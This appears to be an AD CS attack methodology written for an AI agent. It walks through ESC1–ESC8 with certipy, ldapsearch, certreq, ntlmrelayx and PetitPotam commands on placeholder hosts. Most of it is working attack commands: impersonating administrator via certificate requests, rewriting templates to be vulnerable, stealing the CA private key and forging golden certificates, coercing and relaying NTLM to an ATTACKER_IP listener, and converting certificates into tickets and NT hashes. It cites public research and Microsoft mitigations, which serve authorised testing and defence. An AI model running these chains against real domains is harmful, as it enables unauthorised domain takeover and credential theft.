---
technology: "Active Directory Certificate Services (AD CS)"
kind: bug-bounty-methodology
audience: ai-agent
family: directory-services
version: "1.0"
provenance: "corpus-mined (29 writeups across the ESC-class, relay, and native-enrollment families) + upstream-verified: SpecterOps 'Certified Pre-Owned' v1.0.1 PDF (ESC1-ESC8 condition sets quoted from the paper text), Certipy README v5.x (ESC1-ESC17), Microsoft KB5005413 (EPA/NTLM mitigation), PetitPotam README (MS-EFSRC coercion, CVE-2021-36942). ESC9+ named only as post-paper classes per Certipy README — definitions not restated from memory. Lab-safe placeholders. Verified 2026-11-12."
---

# AD CS bug bounty methodology

Target model: EXAMPLE.COM, CA `example-CA` on ca01.example.com (198.51.100.20),
DC dc01.example.com (198.51.100.10). Foothold: any authenticated domain user (or
an ACL write — see [[ad-acl]]). Companion overview: [[ad-cs|AD CS]]. Cross-units:
ESC8 relay tooling in [[ntlm]]; template/CA objects are enumerated via the LDAP
surface in [[ldap-ad]].

## Triage table

| Class | Object | Core condition (paper-verified) | Min priv |
|---|---|---|---|
| ESC1 | template | enroll + no approval/signatures + auth EKU + ENROLLEE_SUPPLIES_SUBJECT (SAN in CSR) | enroll right |
| ESC2 | template | same but Any Purpose / no EKU | enroll right |
| ESC3 | 2 templates | Certificate Request Agent EKU + a second template allowing "enroll on behalf" | enroll on 1st |
| ESC4 | template ACL | write control of a template object → flip it to ESC1 | write on template |
| ESC5 | PKI container ACL | control of CA computer obj / NTAuthCertificates / Public Key Services subtree | the ACL win |
| ESC6 | CA flag | EDITF_ATTRIBUTESUBJECTALTNAME2 → SAN honored in any template (default User incl.) | enroll (flag pre-set) |
| ESC7 | CA ACL | ManageCA (config/SAN flag) or ManageCertificates (approve pending) | the CA right |
| ESC8 | HTTP endpoint | web enrollment over HTTP + NTLM → relay target | network position |

Phase order: 0 find → 1 pick class → 2 request/relay → 3 authenticate → 4 (ACL
classes) repair-template considerations.

## Phase 0 — Enumerate (certipy and raw LDAP)

```bash
certipy find -u user@EXAMPLE.COM -p 'Password123!' -dc-ip 198.51.100.10 -vulnerable \
  -old-bloodhound            # or stdout; the standard opener in nearly every domain engagement
```

Output to read first: `[X] Vulnerable Certificates Templates`, then per-template
`ESC1 : 'EXAMPLE\Domain Users' can enroll, …`. The same data raw (when certipy
is blocked; all via [[ldap-ad]] basics):

```bash
# CA objects: CN=Enrollment Services,CN=Public Key Services,CN=Configuration,DC=example,DC=com
#   → dNSHostName of the CA, certificate templates it issues (certificatesTemplate list)
# templates: CN=Certificate Templates,CN=Public Key Services,CN=Configuration,…
ldapsearch -x -H ldap://198.51.100.10 -D 'user@example.com' -w 'Password123!' \
  -b 'CN=Certificate Templates,CN=Public Key Services,CN=Configuration,DC=example,DC=com' \
  '(objectClass=pKICertificateTemplate)' cn pKIExtendedKeyUsage msPKI-Certificate-Name-Flag \
  msPKI-Enrollment-Flag nTSecurityDescriptor
# name-flag 1 (0x1) = CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT → SAN-in-CSR (ESC1 half)
# EKU OIDs that authenticate: 1.3.6.1.5.5.7.3.2 client auth · 1.3.6.1.5.2.3.4 PKINIT
#   1.3.6.1.4.1.311.20.2.2 smart-card logon · 2.5.29.37.0 any purpose · none = SubCA (ESC2)
```

Also confirm ESC8 surface: `http://198.51.100.20/certsrv/` answering (one
observed engagement used `/certsrv` + `/certenroll` web dirs as the tell).

## Phase 1 — ESC1/ESC2: request a cert as someone else

```bash
certipy req -u user@EXAMPLE.COM -p 'Password123!' -ca example-CA \
  -template VulnTemplate -upn administrator@example.com -dc-ip 198.51.100.10
#  -upn (or -dns for machine targets) sets the SAN — allowed because the template
#  carries CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (paper: ESC1 5th condition)
#  ESC2 variant: no -upn needed; the Any-Purpose/SubCA cert itself is the win
# three observed chains hit ESC1; the certreq.exe -submit -config equivalent:
```

Windows-native form: `certreq.exe -submit -config ca01.example.com\example-CA -attrib "CertificateTemplate:VulnTemplate&SAN:administrator@example.com" request.csr`.

## Phase 2 — ESC3: enrollment-agent chain

Two-template attack (paper-verified conditions): (1) enroll in a template with
Certificate Request Agent EKU `1.3.6.1.4.1.311.20.2.1`; (2) use that cert to
co-sign a CSR for a victim against a template whose Application Policy Issuance
Requirements accept the Request Agent EKU, with agent restrictions not implemented
on the CA.

```bash
certipy req -u user@EXAMPLE.COM -p 'Password123!' -ca example-CA -template EnrollAgent
certipy req -u user@EXAMPLE.COM -key enrollment-agent.pfx -ca example-CA \
  -template UserVPN -upn administrator@example.com    # on-behalf-of request
# two observed ESC3 chains, one as an enrollment-agent pivot
```

## Phase 3 — ESC4/ESC5: write your own misconfiguration

Template or PKI-object control (from [[ad-acl]] findings) is converted to ESC1 by
editing the object, then requesting normally:

```bash
certipy template -u user@EXAMPLE.COM -p 'Password123!' -dc-ip 198.51.100.10 \
  -template SafeTemplate -write-default-configuration
#   → saves current config to JSON, rewrites the template to ESC1-vulnerable defaults
#     (enrollee-supplied SAN + client-auth EKU + broad enroll); -write-configuration restores
certipy req -u user@EXAMPLE.COM -p 'Password123!' -ca example-CA -template SafeTemplate \
  -upn administrator@example.com
# observed forms: Cert Publishers → ESC4; direct ESC4; GenericAll → ESC4/ESC1
```

ESC5 is the same move on the container/NTAuthCertificates side — control of
`NTAuthCertificates` or the Enrollment Services container can make an
attacker-controlled CA a trusted logon issuer (paper: "compromise the PKI system").

## Phase 4 — ESC6/ESC7: CA-side flags and rights

```bash
# ESC6 pre-set: SAN honored on ANY enrollable template (incl. default User) — no write needed
certipy req -u user@EXAMPLE.COM -p 'Password123!' -ca example-CA -template User \
  -upn administrator@example.com            # paper: -attrib "SAN:" mechanism; flag does the rest

# ESC7 ManageCA/ManageCertificates (verified flag set):
certipy ca -u user@EXAMPLE.COM -p 'Password123!' -target ca01.example.com \
  -config 'ca01.example.com\\example-CA' -backup      # steals CA cert + private key → forge below
certipy ca -ca example-CA -issue-request <id>         # approve a stuck (manager-approval) request
certipy forge -ca-pfx example-CA.pfx -subject user -crl 'http://example.com/a.crl'
#   → signs certs for ANY identity offline from the stolen CA key (golden certificate)
# two observed ESC7 chains, one via policy manipulation
```

PSPKI's `Get-CertificationAuthority | Get-CertificationAuthorityAcl` is the paper's
ESC7 enumeration form (Windows side).

## Phase 5 — ESC8: relay a victim into a certificate

Chain (field-standard, see [[ntlm]] for the relay unit's full method):

```bash
# 1. listener: relay into web enrollment, request a cert AS the coerced machine/user
impacket-ntlmrelayx -t http://198.51.100.20/certsrv/ -smb2support --http-port 80 \
  --template DomainController       # six observed relay chains; certsrv was the recurring relay target
# consolidated alternative (verified flags):
certipy relay -target 'http://ca01.example.com/' -template DomainController   # SMB listener on 445
# (PetitPotam or PrinterBug coerces:)
python3 PetitPotam.py ATTACKER_IP 198.51.100.10      # MS-EFSRC; needs no creds vs a DC
# 2. resulting .pfx authenticates as the victim — durable past the relay window
```

Paper-verified why it works: web enrollment defaults to HTTP + NTLM-only auth;
CES/CEP/NDES negotiate but allow NTLM downgrade, and HTTPS without channel
binding does not protect (EPA not enabled on IIS by default). Microsoft's
KB5005413 mitigation is exactly "enable EPA (Required) or disable NTLM on those
IIS apps" — its presence in an engagement report is the ESC8-fixed signal.

## Phase 6 — Authenticate with the cert

```bash
certipy auth -pfx administrator.pfx -dc-ip 198.51.100.10
#  → PKINIT: TGT as the SAN principal, and (paper) the victim's NT hash via PKINIT —
#    the relay/cert converts into a hash you can pass ([[ntlm]]) or a ticket ([[kerberos]])
# Schannel path (LDAPS/SMB signing scenarios): certipy auth -ldap-shell / pass-the-cert tooling
```

Decision points: kerberos PKINIT failing with cert mapping errors on hardened
estates (KB-class strong-mapping changes) → fall back to Schannel LDAPS shell;
machine SAN (`-dns dc01.example.com`) for DCSync-capable cert identities →
[[ntds]].

## Misconfig → ESC mapping (audit checklist)

| What you observed | Class | Move |
|---|---|---|
| enrollable template + name-flag 0x1 + auth EKU | ESC1 | req -upn |
| enrollable + Any Purpose/no EKU | ESC2 | req, use cert directly |
| Request-Agent EKU template enrollable | ESC3 | two-step req |
| write/GenericAll on a template object | ESC4 | template -save-old → ESC1 |
| write on Public Key Services subtree / NTAuth | ESC5 | object-control, e.g. rogue CA trust |
| CA runs with EDITF_ATTRIBUTESUBJECTALTNAME2 | ESC6 | req -upn on ANY template |
| ManageCA / ManageCertificates on CA | ESC7 | ca -config / approve |
| certsrv over HTTP | ESC8 | ntlmrelayx + coercion |

Post-paper classes (ESC9 no-security-extension, ESC10 weak certificate mapping,
through ESC17) exist in current Certipy — `certipy find` flags them; treat as
hardening-era classes, definitions per the Certipy wiki (not re-derived here).

## Tool map (prose)

Certipy (enumerate/request/ca/relay/auth — field's default), Impacket
ntlmrelayx (ESC8 endpoint), PetitPotam and Coercer-style tools (MS-EFSRC/MS-RPRN
coercion), certreq/certlm.msc (native Windows enrollment, field-observed), PSPKI
PowerShell (Get-CertificationAuthorityAcl — paper's ESC7 enum), Certify (C#-side
equivalent of certipy find). BloodHound ingest includes cert-template edges via
the same LDAP reads ([[ldap-ad]]).
